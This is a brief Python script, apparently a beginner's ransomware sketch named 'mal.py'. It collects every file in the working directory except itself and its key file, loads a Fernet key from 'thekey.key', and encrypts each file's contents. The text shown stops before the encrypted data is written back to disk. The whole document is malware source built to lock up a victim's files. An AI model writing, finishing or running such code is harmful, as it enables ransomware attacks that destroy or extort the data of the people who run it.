import os
import cryptography
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
  if file == "mal.py" or file == "thekey.key":
    continue
  if os.path.isfile(file):
    files.append(file)

print(files)

with open("thekey.key", "rb") as key:
  secretkey = key.read()

for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(secretkey).encrypt(contents)
  
